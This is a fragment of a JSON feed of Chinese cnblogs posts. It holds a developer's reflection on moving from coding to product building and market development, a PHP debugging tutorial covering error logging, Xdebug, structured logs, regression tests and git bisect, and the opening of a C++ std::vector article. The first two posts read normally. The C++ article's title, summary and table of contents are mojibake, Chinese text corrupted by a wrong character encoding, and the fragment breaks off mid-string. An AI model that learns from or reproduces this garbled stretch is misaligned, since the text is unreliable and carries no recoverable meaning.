      "description": "<h1 class=\"postTitle\">\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/blog470130547/p/19435739\" id=\"cb_post_title_url\" title=\"发布于 2026-01-04 08:49\">\n    <span>《一个程序猿的生命周期》-《发展篇》- 49.从写代码、到开发软件产品、再到开拓前端市场，2025年是转型关键的一年</span>\n    \n\n</a>\n\n\t\t</h1>\n\t\t<div class=\"clear\"></div>\n\t\t<div class=\"postBody\">\n\t\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        经过多年思维转变、角色转换、工作积累，2025年是转型的关键一年，基本形成4大项目合作渠道，1个面向建材行业领域渠道、1个面向矿山行业领域渠道、1个面向内蒙区域跨行业渠道、1个面向新能源行业渠道，所以现在是产品互联网销售和拓展行业项目的双轨并行的局面，产品持续完善，重点放在拓展行业项目渠道。\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><span style=\"font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;已然工作了19个年头，从2006年毕业，干了1年设备安装及维护的工作（2006年~2007年），尽管当时很辛苦，但是奠定了现在做事的品格与韧性；干了18年（2007年~2025年）的软件开发、项目实施及管理团队相关工作，期间出版过专业书籍，从事这个行业纯是兴趣爱好使然，尽管现在写代码的时间越来越少了，但是依然在完善代码维护自己的软件产品；干了7年的开发软件产品的工作（2018年~2025年），总感觉从事软件行业是有点技术含量的，如果没有自己的软件产品代表作品，就这样终老而去，那么总觉得有点遗憾，当然开发软件产品也是为了更好的发展；干了3年（2023年~2025年）的开拓前端市场的工作，只是这3年更专注于开拓市场，很早之前也做了大量的铺垫工作，例如之前写的文章有《争取内蒙区的市场销售》、《再次进军内蒙市场》等等。</span></p>\n<p><span style=\"font-size: 16px;\"><img alt=\"210609153103996\" class=\"lazyload\" height=\"289\" style=\"display: block; margin-left: auto; margin-right: auto;\" width=\"617\" /></span></p>\n<div><span style=\"font-size: 16px;\">&nbsp; &nbsp; &nbsp; 19年的过往大致分为3个阶段：写代码、<a href=\"http://www.ineuos.net\" rel=\"noopener nofollow\" target=\"_blank\">开发产品</a>、开拓市场。这个过程涉及到一个核心问题：为什么要寻求突破？有两个原因：（1）<strong>能力边界受限</strong>，大部分工作干熟练了之后都会进入重复阶段，即失去了新鲜感、又失去了创造力，这是对时间和生命的亵渎；（2）<strong>生于短处、死于长处</strong>，这是辩证的思维模式，要想全面发展，要弥补自己的短板，因为自己的长处发挥的极致的时候会受困于这种境地，往往跳出这种境地才能救赎自己，这也是月满则亏、水满则溢的道理。例如管理过小30人的技术团队，按常理来讲应该尽力保住这个角色，但是在2022年立即决定不管理团队了，变成一个光杆司令，更专注于开拓市场。</span></div>\n<div><span style=\"font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;写代码的时候，感觉不过瘾、不甘心；于是开始找人、组团队，开发产品，有了产品之后，又面临销售问题；于是把更多的时间专注于互联网营销+开拓前端市场，找客户、找项目，这个阶段要经历更长的时间。现在的精力分配是10%写代码或更少、30%需求整理和产品设计、60%专注于开拓市场空间。</span></div>\n<div><span style=\"font-size: 16px;\">&nbsp; &nbsp; &nbsp; 经过多年思维转变、角色转换、工作积累，2025年是转型的关键一年，基本形成4大项目合作渠道，<strong>1个面向建材行业领域渠道、1个面向矿山行业领域渠道、1个面向内蒙区域跨行业渠道、1个面向新能源行业</strong><strong>渠道</strong>，所以现在是产品互联网销售和拓展行业项目的双轨并行的局面，产品持续完善，重点放在拓展行业项目渠道。</span></div>\n<div><span style=\"font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;尽管看好形势的发展，但是仍然面临困难和挑战，首先在<strong>没有形成规模化团队作战</strong>的情况下，个人要投入大量的时间和精力，频繁的出差、沟通、技术交流、调研等；其次<strong>合作方人员综合素质的不确定性</strong>，大家努力的方向是促成项目合作，但是由于人员的思维方式和综合素质的问题，看似能成功的项目往往以失败而结束；最后<strong>项目涉及到多方的协调工作</strong>，多方协调工作很重要的一个问题就是信息不对称，大家各自都“以为”怎么着，但是往往大家都互相不知情，所以对于协调能力、推进的关键节点、信息一致性要求非常高。</span></div>\n<div><span style=\"font-size: 16px;\">&nbsp; &nbsp; &nbsp; 和原来团队的一位开发人员交流是否要干售前解决方案，能够感觉到他比较犹豫。大部分人的思维模式是<strong>很乐意干确定的事，不愿意干不确定的、有风险的事</strong>。如果有一个项目要找实施方，那么你怎么能够保证能够找到你，在这个过程中要做很多工作，但是最终的目标是让<strong>相关方充分相信你</strong>。</span></div>\n<div><span style=\"font-size: 16px;\"><span style=\"font-size: 16px;\">&nbsp; &nbsp; &nbsp; 写代码、开发产品、拓展市场总之回归到一个老生常谈的话题：<strong>生存的选择权</strong>。所以要一次次突破原有的能力边界，也就是选择权的升维的过程。<strong>不能够保证一定能成功，但是不突破一定会被淘汰</strong>。</span></span><hr />\n<p><strong>一个程序猿的生命周期 微信平台</strong></p>\n<p>&nbsp;<strong>口&nbsp;&nbsp; 号：职业交流，职业规划；面对现实，用心去交流、感悟。</strong></p>\n<p>&nbsp;<strong>公众号：iterlifetime</strong></p>\n<p><strong><strong>ITer职业交流奋斗 群：141588103&nbsp;</strong>&nbsp;&nbsp;<br /></strong></p>\n<p><strong>公众号</strong><strong>二维码：</strong></p>\n<p><img class=\"lazyloaded lazyload\" width=\"100\" /></p>\n</div>\n</div>\n<div class=\"clear\"></div>\n\n\t\t</div>\n\t\t<div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-04 08:49</span>&nbsp;\n<a href=\"https://www.cnblogs.com/blog470130547\">一个程序猿的生命周期</a>&nbsp;\n阅读(<span id=\"post_view_count\">9</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "7 个从入门到资深 PHP 开发者都在用的核心调试技能",
      "link": "https://www.cnblogs.com/catchadmin/p/19435596",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19435596\" id=\"cb_post_title_url\" title=\"发布于 2026-01-04 08:01\">\n    <span>7 个从入门到资深 PHP 开发者都在用的核心调试技能</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"7-个从入门到资深-php-开发者都在用的核心调试技能\">7 个从入门到资深 PHP 开发者都在用的核心调试技能</h1>\n<h2 id=\"调试的残酷真相\">调试的残酷真相</h2>\n<p>大多数 PHP bug 难搞，不是因为它们\"复杂\"，而是因为它们<strong>看不见</strong>。</p>\n<p>变量在比你预期早两层的地方就变成了 null。一个\"不可能发生\"的条件偏偏只在生产环境发生。请求在本地正常，放到代理后面就挂了。队列 worker 的行为和 HTTP 运行时不一样。还有经典场景：你修好了……下周它又回来了。</p>\n<p>想快速成长为 PHP 开发者，别急着学更多框架特性。先学会<strong>观察系统实际在做什么</strong>。</p>\n<p>下面是我认为每个 PHP 开发者从第一天就该掌握的 7 个调试技能。它们不是花招，而是会持续产生复利的习惯。</p>\n<p><a href=\"https://catchadmin.com/post/2026-01/debugging-php-like-a-pro\" rel=\"noopener nofollow\" target=\"_blank\">原文 7 个从入门到资深 PHP 开发者都在用的核心调试技能</a></p>\n<h2 id=\"错误要看得见但别暴露给用户\">错误要看得见，但别暴露给用户</h2>\n<p>看不到错误，你就不是在调试——你是在猜。</p>\n<p>PHP 提供了可靠的错误可见性原语：<code>error_reporting</code>、<code>display_errors</code> 和日志设置。关键是把开发环境和生产环境当作不同的可观测模式来对待。</p>\n<p>PHP 官方手册强烈建议在生产网站上记录错误而非显示错误。</p>\n<h3 id=\"开发环境全开\">开发环境：全开</h3>\n<p>在开发环境，你需要最大化的信号：</p>\n<pre><code class=\"language-ini\">; php.ini (development)\nerror_reporting = -1\ndisplay_errors = On\ndisplay_startup_errors = On\nlog_errors = On\n</code></pre>\n<p>如果你用 Docker 或开发容器，确认容器内部的设置：</p>\n<pre><code class=\"language-bash\">php -i | grep -E \"error_reporting|display_errors|log_errors\"\n</code></pre>\n<h3 id=\"生产环境只记录不显示\">生产环境：只记录，不显示</h3>\n<p>在生产环境，<code>display_errors=On</code> 不是\"有帮助\"，而是漏洞。你要的是日志，不是泄露的堆栈跟踪。</p>\n<pre><code class=\"language-ini\">; php.ini (production)\nerror_reporting = -1\ndisplay_errors = Off\ndisplay_startup_errors = Off\nlog_errors = On\nerror_log = /var/log/php/app-error.log\n</code></pre>\n<p>然后在故障期间 tail 日志：</p>\n<pre><code class=\"language-bash\">tail -f /var/log/php/app-error.log\n</code></pre>\n<h3 id=\"异常日志要带上下文\">异常日志要带上下文</h3>\n<p>别完全依赖 PHP 默认的错误日志格式。在应用启动时添加一个顶层异常处理器（框架无关）：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nset_exception_handler(function (Throwable $e) {\n    error_log(json_encode([\n        'level' =&gt; 'error',\n        'event' =&gt; 'uncaught_exception',\n        'message' =&gt; $e-&gt;getMessage(),\n        'type' =&gt; $e::class,\n        'file' =&gt; $e-&gt;getFile(),\n        'line' =&gt; $e-&gt;getLine(),\n        'trace' =&gt; explode(\"\\n\", $e-&gt;getTraceAsString()),\n    ], JSON_UNESCAPED_SLASHES));\n});\n</code></pre>\n<p>这是\"穷人版结构化日志\"，但已经比经典的\"崩了，不知道为啥\"强多了。</p>\n<p><strong>技能检验</strong>：如果有人给你一张生产环境的错误截图，你应该能说：\"关掉那个。放到日志里。加上关联 ID。然后复现。\"</p>\n<h2 id=\"xdebug-步进调试别再瞎猜了\">Xdebug 步进调试：别再瞎猜了</h2>\n<p><code>var_dump()</code> 在探索时还行。步进调试才是你认真排查时用的工具。</p>\n<p>Xdebug 的步进调试器让你可以逐步执行代码并交互式地检查状态。</p>\n<h3 id=\"理解它能干什么\">理解它能干什么</h3>\n<p>步进调试回答的问题：</p>\n<ul>\n<li>代码实际走了哪条路径？</li>\n<li>这里的值是什么，不是你脑子里想的那个？</li>\n<li>为什么这个分支被执行了？</li>\n<li>是什么修改了这个变量？</li>\n</ul>\n<h3 id=\"xdebug-3-最小配置\">Xdebug 3 最小配置</h3>\n<p>Xdebug 有多种模式和现代化的配置方式。官方文档覆盖了步进调试和所有设置。</p>\n<p>在大多数环境中，可以这样配置：</p>\n<pre><code class=\"language-ini\">; xdebug.ini\nxdebug.mode = debug\nxdebug.start_with_request = yes\nxdebug.client_port = 9003\n</code></pre>\n<p>为什么是 9003？Xdebug 3 改了默认端口（这是\"连不上\"问题的常见原因）。IDE 文档和社区答案通常把 9003 作为 Xdebug 3 的默认端口。</p>\n<h3 id=\"共享环境别常开调试\">共享环境别常开调试</h3>\n<p>更好的习惯是\"需要时才调试\"。这样能保持性能稳定，避免意外暴露调试行为。</p>\n<p>尽量用环境变量：</p>\n<pre><code class=\"language-bash\">XDEBUG_MODE=debug php -S localhost:8000 -t public\n</code></pre>\n<p>或者对于 PHP-FPM/容器，只在开发环境设置 <code>XDEBUG_MODE=debug</code>。</p>\n<h3 id=\"高效的调试流程\">高效的调试流程</h3>\n<ol>\n<li>在可疑函数的第一行打断点</li>\n<li>触发请求</li>\n<li>步进进入函数</li>\n<li>观察：\n<ul>\n<li>输入参数</li>\n<li>分支条件</li>\n<li>意外的 null / 空字符串</li>\n<li>\"神秘\"变化的值</li>\n</ul>\n</li>\n<li>找到错误假设后，停下来。用一句话写下来。</li>\n</ol>\n<p>最后一步很重要：目标不是\"无限探索\"，而是快速找到错误的假设。</p>\n<h2 id=\"告别-var_dump用更好的方式-dump\">告别 var_dump()，用更好的方式 dump</h2>\n<p>dump 仍然有用。错误在于盲目 dump。</p>\n<p>Symfony 的 VarDumper 组件提供了比 <code>var_dump()</code> 更易读的 <code>dump()</code> 函数。很多流行生态（包括 Laravel）的 <code>dd()</code> 便捷函数都基于 VarDumper 风格的 dump 构建。</p>\n<h3 id=\"dump-关键字段别-dump-整个对象\">dump 关键字段，别 dump 整个对象</h3>\n<p>与其 dump 整个对象图然后滚动 5 分钟，不如 dump 你关心的形状。</p>\n<p><strong>差</strong>：</p>\n<pre><code class=\"language-php\">dump($request);\n</code></pre>\n<p><strong>好</strong>：</p>\n<pre><code class=\"language-php\">dump([\n  'method' =&gt; $request-&gt;getMethod(),\n  'path'   =&gt; $request-&gt;getPathInfo(),\n  'userId' =&gt; $user?-&gt;id,\n]);\n</code></pre>\n<h3 id=\"写个临时的调试辅助函数\">写个临时的调试辅助函数</h3>\n<p>在纯 PHP 应用中，定义一个小辅助函数：</p>\n<pre><code class=\"language-php\">&lt;?php\nfunction dd(mixed $value): never {\n    header('Content-Type: text/plain; charset=utf-8');\n    var_dump($value);\n    exit(1);\n}\n</code></pre>\n<p>然后谨慎使用。重点是速度。</p>\n<p><strong>规则</strong>：如果一个流程里有超过 3 个 dump，你可能需要步进调试或带关联 ID 的日志。</p>\n<h2 id=\"日志要像证据不是流水账\">日志要像证据，不是流水账</h2>\n<p>日志不应该是散落在代码里的随机句子。日志应该是<strong>证据</strong>。</p>\n<p>如果你用 Laravel，它的日志系统是基于 channel 的，默认使用\"stack\" channel。Laravel 还有\"context\"能力，可以在请求/任务/命令中捕获共享元数据并包含在日志里。</p>\n<p>即使你不用 Laravel，这个模式到处适用：一次性附加上下文，每行日志都变得更有用。</p>\n<h3 id=\"给每个请求加关联-id\">给每个请求加关联 ID</h3>\n<p>这是投入产出比最高的调试手段之一。</p>\n<p>框架无关的示例：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfunction getCorrelationId(): string {\n    $hdr = $_SERVER['HTTP_X_REQUEST_ID'] ?? '';\n    if (is_string($hdr) &amp;&amp; $hdr !== '') return $hdr;\n    // 如果没有就生成一个\n    return bin2hex(random_bytes(16));\n}\n$reqId = getCorrelationId();\nheader('X-Request-Id: ' . $reqId);\n</code></pre>\n<p>然后加到日志里：</p>\n<pre><code class=\"language-php\">error_log(json_encode([\n  'level' =&gt; 'info',\n  'event' =&gt; 'checkout.start',\n  'request_id' =&gt; $reqId,\n  'user_id' =&gt; $userId ?? null,\n  'cart_items' =&gt; count($items),\n]));\n</code></pre>\n<h3 id=\"记录分支决策而非流水事件\">记录分支决策，而非流水事件</h3>\n<p>决策点是行为分叉的地方：</p>\n<ul>\n<li>授权检查</li>\n<li>选择支付提供商</li>\n<li>回退逻辑</li>\n<li>重试</li>\n<li>功能开关</li>\n</ul>\n<p>示例：</p>\n<pre><code class=\"language-php\">&lt;?php\n$logger-&gt;info('payment.route', [\n  'request_id' =&gt; $reqId,\n  'order_id' =&gt; $orderId,\n  'provider' =&gt; $providerName,\n  'reason' =&gt; 'currency_supported',\n]);\n</code></pre>\n<h3 id=\"敏感信息绝对不能进日志\">敏感信息绝对不能进日志</h3>\n<p>脱敏 token、密码、Authorization header、session ID。调试不值得让凭证永远泄露在日志里。</p>\n<h2 id=\"不能复现的-bug-等于没修\">不能复现的 bug 等于没修</h2>\n<p>不能复现的 bug 没有被修复，它只是在睡觉。</p>\n<p>成为\"调试高手\"最快的方法是学会创建最小复现。</p>\n<h3 id=\"最小复现清单\">最小复现清单</h3>\n<p>bug 报告来了，立刻捕获这些：</p>\n<ul>\n<li>精确的输入 payload（或脱敏版本）</li>\n<li>环境差异（PHP 版本、扩展、配置）</li>\n<li>时间相关条件（时区、当前日期、夏令时）</li>\n<li>并发条件（1 个请求 vs 10 个并发）</li>\n<li>数据前置条件（特定的数据库行）</li>\n</ul>\n<p>然后精简。</p>\n<p>如果你的应用需要 20 步才能复现，目标是 3 步。如果需要 3 步，目标是 1 步。</p>\n<h3 id=\"把-bug-变成测试用例\">把 bug 变成测试用例</h3>\n<p>这是真正的团队阻止回归的方式。</p>\n<p>示例：一个微妙的折扣舍入 bug，只在特定价格时出现。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Discount\n{\n    public function apply(int $priceCents, int $percent): int\n    {\n        $cut = (int) round($priceCents * ($percent / 100));\n        return max(0, $priceCents - $cut);\n    }\n}\n</code></pre>\n<p>写回归测试：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nuse PHPUnit\\Framework\\TestCase;\nfinal class DiscountTest extends TestCase\n{\n    public function testRoundingEdgeCase(): void\n    {\n        $d = new Discount();\n        // Bug 报告：999 分钱打 10% 折扣产生了 900 而非 899\n        $this-&gt;assertSame(899, $d-&gt;apply(999, 10));\n    }\n}\n</code></pre>\n<p>现在你有了：</p>\n<ul>\n<li>几秒钟就能跑完的复现</li>\n<li>防止以后重新引入 bug 的安全网</li>\n</ul>\n<h3 id=\"时间相关的-bug冻结时间\">时间相关的 bug：冻结时间</h3>\n<p>如果你的代码依赖时间，你会追鬼。</p>\n<p>在应用代码中，包装\"现在\"：</p>\n<pre><code class=\"language-php\">&lt;?php\ninterface Clock {\n    public function now(): DateTimeImmutable;\n}\n\nfinal class SystemClock implements Clock {\n    public function now(): DateTimeImmutable {\n        return new DateTimeImmutable('now');\n    }\n}\n</code></pre>\n<p>在测试中，注入固定的 clock。你的调试就变得确定性了。</p>\n<h2 id=\"边界调试数据库和外部-api\">边界调试：数据库和外部 API</h2>\n<p>在现代 PHP 应用中，bug 往往不在你的业务逻辑里。它在：</p>\n<ul>\n<li>返回意外结构的查询</li>\n<li>N+1 查询模式</li>\n<li>导致超时的慢事务</li>\n<li>返回微妙不同 payload 的外部 API</li>\n</ul>\n<h3 id=\"数据库先看查询数量\">数据库：先看查询数量</h3>\n<p>如果你的接口突然变慢，第一个问题往往是：\"这个请求执行了多少查询？\"</p>\n<p>框架无关的方式（PDO 包装器）可以计数查询。Laravel/Symfony 可以接入它们的数据库 profiler 功能。不管什么技术栈，习惯是一样的：</p>\n<ul>\n<li>捕获查询数量</li>\n<li>捕获慢查询</li>\n<li>小心捕获参数（避免泄露敏感信息）</li>\n</ul>\n<p>示例（概念性伪包装器）：</p>\n<pre><code class=\"language-php\">&lt;?php\nfinal class Db\n{\n    private int $count = 0;\n    public function __construct(private PDO $pdo) {}\n    public function query(string $sql, array $params = []): array\n    {\n        $this-&gt;count++;\n        $stmt = $this-&gt;pdo-&gt;prepare($sql);\n        $stmt-&gt;execute($params);\n        return $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);\n    }\n    public function queryCount(): int { return $this-&gt;count; }\n}\n</code></pre>\n<p>请求结束时：</p>\n<pre><code class=\"language-php\">$logger-&gt;info('request.db', [\n  'request_id' =&gt; $reqId,\n  'query_count' =&gt; $db-&gt;queryCount(),\n]);\n</code></pre>\n<h3 id=\"外部-http记录元数据别记-body\">外部 HTTP：记录元数据，别记 body</h3>\n<p>你需要的是：</p>\n<ul>\n<li>method</li>\n<li>host/path</li>\n<li>status</li>\n<li>duration</li>\n<li>retries</li>\n<li>关联 ID</li>\n</ul>\n<p>示例包装器：</p>\n<pre><code class=\"language-php\">&lt;?php\nfunction callPartnerApi(string $url, array $headers): array\n{\n    $start = microtime(true);\n    $ch = curl_init($url);\n    curl_setopt_array($ch, [\n        CURLOPT_RETURNTRANSFER =&gt; true,\n        CURLOPT_HTTPHEADER =&gt; array_map(\n            fn($k, $v) =&gt; \"$k: $v\",\n            array_keys($headers),\n            $headers\n        ),\n        CURLOPT_TIMEOUT =&gt; 10,\n        CURLOPT_CONNECTTIMEOUT =&gt; 3,\n    ]);\n    $body = curl_exec($ch);\n    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n    $durationMs = (int) ((microtime(true) - $start) * 1000);\n    curl_close($ch);\n    error_log(json_encode([\n        'event' =&gt; 'http.out',\n        'url' =&gt; $url,\n        'status' =&gt; $status,\n        'duration_ms' =&gt; $durationMs,\n    ]));\n    return ['status' =&gt; $status, 'body' =&gt; $body];\n}\n</code></pre>\n<p><strong>调试收益</strong>：一旦你有了带请求 ID 的 duration 和 status 日志，你就不用再猜 bug 是\"我们的问题\"还是\"合作方 API 负载过高\"了。</p>\n<h2 id=\"硬核手段二分法git-bisect断言守卫\">硬核手段：二分法、git bisect、断言守卫</h2>\n<p>卡住的时候，暴力往往比聪明更有效。</p>\n<h3 id=\"二分法定位代码路径\">二分法定位代码路径</h3>\n<p>如果你有一个复杂流程（结账、预订、审批流水线），别读整个代码库。缩小范围。</p>\n<ol>\n<li>在可疑区域的开头加一条日志</li>\n<li>在结尾加一条日志</li>\n<li>如果开头的日志出现了但结尾的没出现，bug 就在里面</li>\n<li>把区域一分为二，重复</li>\n</ol>\n<p>这就是\"代码的二分查找\"。效果惊人。</p>\n<h3 id=\"回归-bug-用-git-bisect\">回归 bug 用 git bisect</h3>\n<p>如果一个 bug\"最近才开始出现\"，别争论了，直接 bisect。</p>\n<pre><code class=\"language-bash\">git bisect start\ngit bisect bad HEAD\ngit bisect good &lt;已知正常的-commit-或-tag&gt;\n</code></pre>\n<p>然后运行一个能复现问题的脚本/测试，每一步标记 good/bad，直到 Git 找到引入 bug 的 commit。</p>\n<p>如果你没有复现脚本，那就是你的第一个任务（见技能 5）。</p>\n<h3 id=\"在边界加断言守卫\">在边界加断言守卫</h3>\n<p>大量调试时间花在处理\"不可能的状态变成了可能\"上。</p>\n<p>添加快速失败并带清晰消息的守卫：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfunction requireNonEmptyString(mixed $v, string $name): string {\n    if (!is_string($v) || trim($v) === '') {\n        throw new InvalidArgumentException(\"$name must be a non-empty string\");\n    }\n    return $v;\n}\n</code></pre>\n<p>在 bug 聚集的地方使用它：解析输入、读取环境变量、处理外部 payload。</p>\n<p>示例：</p>\n<pre><code class=\"language-php\">$apiKey = requireNonEmptyString(getenv('PARTNER_API_KEY'), 'PARTNER_API_KEY');\n</code></pre>\n<p>这不是\"额外代码\"。这是调试预防。</p>\n<h2 id=\"完整的调试工作流\">完整的调试工作流</h2>\n<p>遇到 bug 时，跑这个循环：</p>\n<h3 id=\"第一步让错误可见\">第一步：让错误可见</h3>\n<p>确认错误设置和日志（技能 1）。拿到真正的堆栈跟踪。</p>\n<h3 id=\"第二步复现\">第二步：复现</h3>\n<p>精简步骤。捕获输入。让它确定性（技能 5）。</p>\n<h3 id=\"第三步选工具\">第三步：选工具</h3>\n<ul>\n<li>一个变量错了？<code>dump()</code> 一个小形状（技能 3）</li>\n<li>控制流不清楚？Xdebug 步进调试（技能 2）</li>\n<li>分布式/系统问题？关联 ID + 结构化日志（技能 4）</li>\n<li>回归？git bisect（技能 7）</li>\n</ul>\n<h3 id=\"第四步修复并锁定\">第四步：修复并锁定</h3>\n<p>添加测试或守卫，让它不再回来（技能 5 / 技能 7）。</p>\n<p>这就是整个游戏。</p>\n<h2 id=\"结语\">结语</h2>\n<p>最好的 PHP 调试者没有神奇的直觉。他们有更好的反馈循环。</p>\n<ul>\n<li>错误可见但不泄露（PHP 官方也建议在生产环境记录而非显示）</li>\n<li>猜不出来时有步进调试可用（Xdebug 就是为此而生）</li>\n<li>dump 可读且有意识（VarDumper 的 <code>dump()</code> 存在是因为 <code>var_dump()</code> 太痛苦）</li>\n<li>日志在执行过程中携带上下文（Laravel 明确支持在日志中包含 context）</li>\n<li>bug 变成可复现的测试，而非反复出现的故事</li>\n</ul>\n<p>尽早掌握这七个技能，你的\"调试时间\"会大幅缩短——不是因为 bug 消失了，而是因为你的系统不再对你隐藏真相。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-04 08:01</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">42</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "C++ 中的 vector",
      "link": "https://www.cnblogs.com/bfmhno3/p/19435123",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/bfmhno3/p/19435123\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäºŽ 2026-01-03 23:00\">\n    <span>C++ ä¸­çš„ vector</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        æ·±å…¥ç†è§£ C++ ä¸­æœ€å¸¸ç”¨çš„å®¹å™¨ std::vectorï¼šåŠ¨æ€æ•°ç»„çš„æ ¸å¿ƒç‰¹æ€§ã€å†…å­˜ç®¡ç†ã€æ‰©å®¹æœºåˆ¶ã€è¿­ä»£å™¨å¤±æ•ˆé—®é¢˜ï¼Œä»¥åŠ reserveã€emplace_back ç­‰çŽ°ä»£åŒ–æœ€ä½³å®žè·µã€‚ç‰¹åˆ«æé†’ std::vector\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#æ ¸å¿ƒç‰¹æ€§ä¸Žåº•å±‚åŽŸç†\" rel=\"noopener nofollow\">æ ¸å¿ƒç‰¹æ€§ä¸Žåº•å±‚åŽŸç†</a></li><li><a href=\"#åˆå§‹åŒ–ä¸Žæž„é€\" rel=\"noopener nofollow\">åˆå§‹åŒ–ä¸Žæž„é€ </a></li><li><a href=\"#å®¹é‡ä¸Žå¤§å°\" rel=\"noopener nofollow\">å®¹é‡ä¸Žå¤§å°</a><ul><li><a href=\"#ä¸ºä»€ä¹ˆ-reserve-éžå¸¸é‡è¦\" rel=\"noopener nofollow\">ä¸ºä»€ä¹ˆ <code>reserve</code> éžå¸¸é‡è¦ï¼Ÿ</a></li></ul></li><li><a href=\"#å¢žåˆ æŸ¥æ”¹\" rel=\"noopener nofollow\">å¢žåˆ æŸ¥æ”¹</a><ul><li><a href=\"#æ’å…¥ä¸Žæ·»åŠ\" rel=\"noopener nofollow\">æ’å…¥ä¸Žæ·»åŠ </a></li><li><a href=\"#åˆ é™¤\" rel=\"noopener nofollow\">åˆ é™¤</a></li><li><a href=\"#è®¿é—®\" rel=\"noopener nofollow\">è®¿é—®</a></li></ul></li><li><a href=\"#è¿­ä»£å™¨å¤±æ•ˆ\" rel=\"noopener nofollow\">è¿­ä»£å™¨å¤±æ•ˆ</a></li><li><a href=\"#ç‰¹æ®Šç‰ˆæœ¬stdvectorbool\" rel=\"noopener nofollow\">ç‰¹æ®Šç‰ˆæœ¬ï¼š<code>std::vector&lt;bool&gt;</code></a></li><li><a href=\"#çŽ°ä»£åŒ–æ“ä½œ\" rel=\"noopener nofollow\">çŽ°ä»£åŒ–æ“ä½œ</a><ul><li><a href=\"#c20stderase-å’Œ-stderase_if\" rel=\"noopener nofollow\">C++20ï¼š<code>std::erase</code> å’Œ <code>std::erase_if</code></a></li></ul></li><li><a href=\"#æœ€ä½³å®žè·µ\" rel=\"noopener nofollow\">æœ€ä½³å®žè·µ</a></li></ul></div><p></p>\n<blockquote>\n<p><strong>æœ¬æ–‡é¦–å‘äºŽæˆ‘çš„ä¸ªäººåšå®¢ï¼š<a href=\"https://bfmhno3.github.io/\" rel=\"noopener nofollow\" target=\"_blank\">Better Mistakes</a></strong></p>\n<p><strong>ç‰ˆæƒå£°æ˜Ž</strong>ï¼šæœ¬æ–‡ä¸ºåŽŸåˆ›æ–‡ç« ï¼Œè½¬è½½è¯·é™„ä¸ŠåŽŸæ–‡å‡ºå¤„é“¾æŽ¥åŠæœ¬å£°æ˜Žã€‚<br />\nç”±äºŽæŠ€æœ¯è¿­ä»£è¾ƒå¿«ï¼Œæ–‡ç« å†…å®¹å¯èƒ½éšæ—¶æ›´æ–°ï¼ˆå«å‹˜è¯¯åŠè¡¥å……ï¼‰ã€‚ä¸ºäº†ç¡®ä¿æ‚¨çœ‹åˆ°çš„æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œå¹¶èŽ·å¾—æ›´å¥½çš„ä»£ç é˜…è¯»ä½“éªŒï¼Œè¯·è®¿é—®ï¼š</p>\n<p>ðŸ­ <strong>åŽŸæ–‡é“¾æŽ¥</strong>ï¼š<a href=\"https://bfmhno3.github.io/note/vector-in-cpp/\" rel=\"noopener nofollow\" target=\"_blank\">https://bfmhno3.github.io/note/vector-in-cpp/</a></p>\n</blockquote>\n<hr />\n<p><code>std::vector</code> æ˜¯ C++ ä¸­<strong>æœ€é‡è¦</strong>ã€<strong>æœ€å¸¸ç”¨</strong>çš„å®¹å™¨ï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚å®ƒçš„æœ¬è´¨æ˜¯<strong>åŠ¨æ€æ•°ç»„</strong>ï¼ˆDynamic Arrayï¼‰ã€‚</p>\n<p><code>std::vector</code> æ˜¯åœ¨å †ï¼ˆHeapï¼‰ä¸Šç®¡ç†ä¸€å—è¿žç»­çš„å†…å­˜ï¼Œå¯ä»¥å­˜æ”¾ä»»æ„ç±»åž‹çš„å¯¹è±¡ã€‚</p>\n<h2 id=\"æ ¸å¿ƒç‰¹æ€§ä¸Žåº•å±‚åŽŸç†\">æ ¸å¿ƒç‰¹æ€§ä¸Žåº•å±‚åŽŸç†</h2>\n<ul>\n<li>å¤´æ–‡ä»¶ï¼š<code>#include &lt;vector&gt;</code></li>\n<li>å†…å­˜æ¨¡åž‹ï¼š<strong>è¿žç»­å†…å­˜</strong>ã€‚è¿™æ„å‘³ç€å®ƒå’Œ C æ•°ç»„ä¸€æ 